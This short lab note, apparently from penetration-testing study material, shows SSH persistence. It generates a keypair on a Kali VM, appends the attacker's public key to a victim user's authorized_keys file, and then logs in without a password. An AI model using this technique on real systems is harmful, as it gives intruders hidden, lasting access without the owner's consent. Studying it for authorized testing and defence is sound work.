### SSH Persistence

1. Generate the SSH keypair on our Kali vm 

```bash
ssh-keygen
```

2. On the linux victim machine, insert the public key into the authorized_keys file

```bash
echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8=kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
```

3. Now we can ssh from our Kali VM using our private key to the linuxvictim machine and log in as the linuxvictim user without a password.

```
ssh linuxvictim@linuxvictim
```
